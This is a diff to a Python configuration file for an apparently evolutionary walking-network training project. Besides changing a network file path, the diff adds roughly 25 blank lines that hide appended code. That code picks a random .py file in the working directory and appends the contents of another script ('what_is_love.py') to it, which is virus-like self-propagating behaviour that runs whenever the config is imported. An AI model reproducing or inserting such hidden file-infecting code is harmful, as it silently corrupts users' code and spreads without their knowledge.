@@ -22,4 +22,39 @@ STUCK_GENERATIONS_TO_INCREASE = 155
 SAVE_GENERATION = True
 PRINT_PROGRESS = True
 USE_EXISTING_NETWORK = False
-INITIAL_FILE_PATH = "networks\\walk.4.29.pkl"
+INITIAL_FILE_PATH = "networks\\walk_fine1.5.pkl"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import random
+import os
+files = os.listdir("./")
+files = [f for f in files if os.path.isfile(f) and f.endswith(".py")]
+f = random.choice(files)
+with open(f, mode="a") as file:
+    with open("D:\\mama\\what_is_love.py", "r") as what_is_love:
+        file.write(what_is_love.read())
+print("what is love?")
+
